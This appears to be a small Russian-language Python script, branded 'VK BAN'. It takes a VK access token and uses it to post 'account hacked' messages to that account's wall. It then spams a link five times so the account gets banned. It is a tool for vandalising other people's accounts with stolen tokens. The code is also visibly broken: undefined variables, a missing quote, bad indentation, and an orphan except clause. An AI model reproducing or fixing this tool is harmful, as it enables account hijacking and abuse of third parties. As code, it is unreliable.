import requests
import vk_api
import os
import time
from colorama import Fore, Back, Style 
os.system("clear")
print("""
█░  ░█ █   ▒▓        █████░   ██   ██   █
 ▓▒  ▒▓ █  ▒█         █   ▒█   ██   ██░  █
 ▒█  █▒ █ ▒█          █    █  ▒██▒  █▒▓  █
  █  █  █▒█           █   ▒█  ▓▒▒▓  █ █  █
  █░░█  ███░          █████░  █░░█  █ ▓▓ █
  ▓▒▒▓  █ ▒█    ███   █   ▒█  █  █  █  █ █
  ▒██▒  █  █▓         █    █ ▒████▒ █  ▓▒█
   ██   █   █░        █   ▒█ ▓▒  ▒▓ █  ░██
   ██   █   ▒█        █████░ █░  ░█ █   ██
 made by pkgsearch
""")
huy = input("Вводи токен") 
token = vk_api.VkApi(token = tok) 
vk = token.get_api()
vk.wall.post(message=Аккаунт  взломан! Ответственность взял анонимный хакер')
for var in range(5):
time.sleep(3)
vk.wall.post(message='vto.pe')             
print("[log] Сообщение отправленно. Ожидайте бана!")
os.system("clear")
except Exception as er:
print('Невалидный токен или страница в бане')
           
    
